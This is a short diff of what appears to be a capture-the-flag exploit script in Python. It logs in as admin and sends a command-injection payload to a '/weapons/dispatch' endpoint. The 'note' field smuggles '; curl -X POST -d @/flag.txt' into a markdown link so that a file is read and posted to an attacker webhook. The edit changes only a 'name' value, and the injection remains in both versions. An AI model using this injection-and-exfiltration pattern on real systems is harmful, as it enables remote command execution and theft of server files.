@@ -26,7 +26,7 @@ class API:
         print(f"[+] Logged in as admin; cookies: {self.c.headers['Cookie']}")
     
     def commandInjection(self):
-        return self.c.post(f"{self.url}/weapons/dispatch", json={"name": "whoami", "price": 100.97, "note": f"![INJECTED](https://google.com ; curl -X POST -d @/flag.txt {self.webhook})", "dispatched_to": "mariaban"}).text
+        return self.c.post(f"{self.url}/weapons/dispatch", json={"name": "gedagedigedagedao", "price": 100.97, "note": f"![INJECTED](https://google.com ; curl -X POST -d @/flag.txt {self.webhook})", "dispatched_to": "mariaban"}).text
 
 class MAIL:
     def deleteAllVerif(self):
